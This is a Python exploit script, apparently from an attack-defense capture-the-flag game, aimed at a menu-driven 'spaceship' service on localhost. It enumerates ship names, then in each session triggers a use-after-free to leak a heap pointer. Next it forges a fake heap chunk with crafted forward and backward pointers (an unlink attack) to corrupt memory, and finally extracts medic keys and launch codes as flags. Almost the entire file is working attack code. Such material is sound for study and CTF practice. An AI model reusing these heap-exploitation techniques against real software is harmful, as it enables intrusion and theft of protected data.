#!/usr/bin/env python3

import subprocess as sp,sys,time,re,string
import threading
from socket import *
from struct import *
idx_read = 0
def read_until(s,c):
    global idx_read
    print("Read idx %d"%idx_read)
    idx_read+=1
    cc = s.recv(1)
    mes=b""
    while cc != c:
        mes+=cc
#        sys.write(cc.decode())
        cc = s.recv(1)
        if len(cc)==0:
            break
    mes += cc
    print("<-",mes)
    try:
        return mes.decode()
    except:
        return mes
def send_mes(s,mes):
    if (type(mes) == type(b"a")):
        mes += b"\n"
        print("->",mes)
        s.send(mes)
    elif (type(mes) == type("a")):
        mes += "\n"
        print("->",mes.encode())
        s.send(mes.encode())
    else:
        print("Cannot encode")
    #s.flush()
    #time.sleep(0.5)

def AllocSpaceship(s,idx,name):
    send_mes(s,"1")
    read_until(s,b"\n")
    send_mes(s,"%d" % idx)
    read_until(s,b"\n")
    send_mes(s,"%s" %name)
    return read_until(s,b">")

def AllocSpaceman(s,idx,name,password):
    send_mes(s,"2")
    read_until(s,b"\n")
    send_mes(s,"%d" % idx)
    read_until(s,b"\n")
    send_mes(s,"%s" % name)
    read_until(s,b"\n")
    send_mes(s,"%s" % password)
    return read_until(proc,b">")

def EditSpaceship(s,idx,name,launch,access,pilot_idx,\
                            medic_idx, engineer_idx,Capitan_idx):
    res=""
    send_mes(s,"5")
    res+=read_until(s,b"\n")
    send_mes(s,"%d" %idx)
    res+=read_until(s,b"\n")
    send_mes(s,"%s" %name)
    res+=read_until(s,b"\n")
    send_mes(s,"%s" %launch)
    res+=read_until(s,b"\n")
    a=read_until(s,b"\n")
    res += a
    if "access" in a:
        send_mes(s,"%s" %access)
        res+=read_until(s,b"\n")
        res+=read_until(s,b"\n")
    send_mes(s,"%d" %pilot_idx)
    res+=read_until(s,b"\n")
    res+=read_until(s,b"\n")
    send_mes(s,"%d" %medic_idx)
    res+=read_until(s,b"\n")
    res+=read_until(s,b"\n")
    send_mes(s,"%d" %engineer_idx)
    res+=read_until(s,b"\n")
    res+=read_until(s,b"\n")
    send_mes(s,"%d" %Capitan_idx)
    res+=read_until(s,b">")
    return res
def EditSpaceman(s,idx,name,password):
    send_mes(s,"8")
    read_until(s,b"\n")
    send_mes(s,"%d" %idx)
    read_until(s,b"\n")
    send_mes(s,name)
    read_until(s,b"\n")
    read_until(s,b"\n")
    send_mes(s,password)
    res=read_until(s,b">")
    return res
def SpacemanAddr(s,idx):
    send_mes(s,"255")
    cont = read_until(s,b">")
    all = re.findall(r'([0-9A-F]+)',cont)
    return int(all[idx],16)

def SpaceshipAddr(s,idx):
    send_mes(s,"254")
    cont = read_until(s,b">")
    all = re.findall(r'([0-9A-F]+)',cont)
    return int(all[idx],16)

def DeleteSpaceman(s,idx):
    send_mes(s,"4")
    read_until(s,b"\n")
    send_mes(s,"%d" %idx)
    read_until(s,b">")

def DumpAddr(s,addr,qw):
    send_mes(s,"257")
    cont = read_until(s,b"\n")
    send_mes(s,"%d"%addr)
    cont = read_until(s,b"\n")
    send_mes(s,"%d"%qw)
    cont = read_until(s,b">")
    print(cont)
def ViewSpaceman(s,idx):
    send_mes(s,"7")
    read_until(s,b"\n")
    read_until(s,b"\n")
    send_mes(s,"%d" %idx)
    a=read_until(s,b">")
    return a
def ViewSpaceship(s,idx):
    send_mes(s,"6")
    read_until(s,b"\n")
    read_until(s,b"\n")
    send_mes(s,"%d" %idx)
    a=read_until(s,b">")
    return a
def ViewLaunch(s,idx,access):
    send_mes(s,"9")
    read_until(s,b"\n")
    send_mes(s,"%d" %idx)
    read_until(s,b"\n")
    send_mes(s,access)
    a=read_until(s,b">")
    return a
def StoreSpaceship(s,idx):
    send_mes(s,"13")
    read_until(s,b"\n")
    send_mes(s,"%d" %idx)
    return read_until(s,b">")
def LoadSpaceship(s,name):
    send_mes(s,"14")
    read_until(s,b"\n")
    send_mes(s,name)
    return read_until(s,b">")
def ViewLaunch(s,idx,acc):
    send_mes(s,"9")
    read_until(s,b"\n")
    send_mes(s,"%d"%idx)
    read_until(s,b"\n")
    send_mes(s,acc)
    return read_until(s,b">")
def SearchSpaceship(s,tmp):
    send_mes(s,"15")
    read_until(s,b"\n")
    read_until(s,b"\n")
    send_mes(s,tmp[:3])
    return read_until(s,b">")
def quit_function(fn_name):
    # print to stderr, unbuffered in Python 2.
    print('{0} took too long'.format(fn_name), file=sys.stderr)
    sys.stderr.flush() # Python 3 stderr is likely buffered.
    thread.interrupt_main() # raises KeyboardInterrupt
def exit_after(s):
    '''
    use as decorator to exit process if
    function takes longer than s seconds
    '''
    def outer(fn):
        def inner(*args, **kwargs):
            timer = threading.Timer(s, quit_function, args=[fn.__name__])
            timer.start()
            try:
                result = fn(*args, **kwargs)
            finally:
                timer.cancel()
            return result
        return inner
    return outer
#@exit_after(15)
def attack1(proc,nam):
    for i in range(9):
        AllocSpaceman(proc,i,"df","sfda")
    AllocSpaceman(proc,9,"df","sfda")
    AllocSpaceman(proc,10,"df","sfda")
    LoadSpaceship(proc,nam)


    #adr9=SpacemanAddr(proc,9)
    #adr10=SpacemanAddr(proc,10)
    #adr11=SpaceshipAddr(proc,0) + 40 + 48 - 8

    EditSpaceship(proc,0,"","","",9,9,9,9)
    #DumpAddr(proc,adr9,50)
    DeleteSpaceman(proc,9)
    #DumpAddr(proc,adr9,50)
    a=ViewSpaceman(proc,9)
    if type(a) != type(b''):
        a = a.encode()
    aa=re.findall(b'Name: (.+)\nShip',a)
    aa[0] = aa[0] + b'\x00' * (8-len(aa[0]))
    adr_f1 = unpack("<Q",aa[0])
    print("Addr:",hex(adr_f1[0]+0x14500+560))
    adr_f1 = adr_f1[0]+0x14500+560
    AllocSpaceship(proc,1,"ZZzzzzzzzz")
    for i in range(9):
        DeleteSpaceman(proc,i)

    a1 = b"a" * 0x0 # prev size
    a1 += pack("<Q",0x80) # fake chunk size
    a1 += pack("<Q",adr_f1)  # address of forward free
    a1 += pack("<Q",adr_f1+8)# address of backward free
    a1 += b'c' * (0x80-4*8) # fill
    a1 += pack("<Q",0x80)  # prev chunk size
    a1 += pack("<Q",0x90)  # chunk size, prev is free
    a1 += b'd'*8
    print("AfterEdit")
    EditSpaceman(proc,9,a1,"")
    #print(hex(adr9),hex(adr10),hex(adr11))
    #DumpAddr(proc,adr9,12)
    #DumpAddr(proc,adr10-32,12)
    #DumpAddr(proc,adr11,12)

    DeleteSpaceman(proc,10)

    #DumpAddr(proc,adr9,12)
    #DumpAddr(proc,adr10-32,12)
    #DumpAddr(proc,adr11,12)

    res=ViewSpaceship(proc,0)
    print(res)
    mkey = re.findall(r'Medic: ([0-9A-z]+)\n',res)
    cnt = ViewLaunch(proc,0,mkey[0])
    print(cnt)
    res = re.findall(r'Launch code: ([0-9A-z=]+)\n',cnt)
    return res # D1KHH7B6,J93RG46

#proc = sp.Popen("./serv13",shell=True,stdin=sp.PIPE,stdout=sp.PIPE)
proc = socket(AF_INET,SOCK_STREAM)
proc.connect(('localhost',3777))

res = read_until(proc,b"\n")
res = read_until(proc,b">")

all_ships = []
for i in string.ascii_uppercase:
    aa=SearchSpaceship(proc,str(i))
    res=re.findall(r'([0-9A-Z]{8})\n',aa)
    for r in res:
        all_ships.append(r)
print(all_ships)
flags = []
proc.close()
for sh in all_ships:
#    try:
        proc = socket(AF_INET,SOCK_STREAM)
        proc.connect(('localhost',3777))
        res = read_until(proc,b"\n")
        res = read_until(proc,b">")
        r=attack1(proc,sh)
        flags.append(r)
        proc.close()
#    except:
#        print("No flag %s\n"%sh)
print(flags)
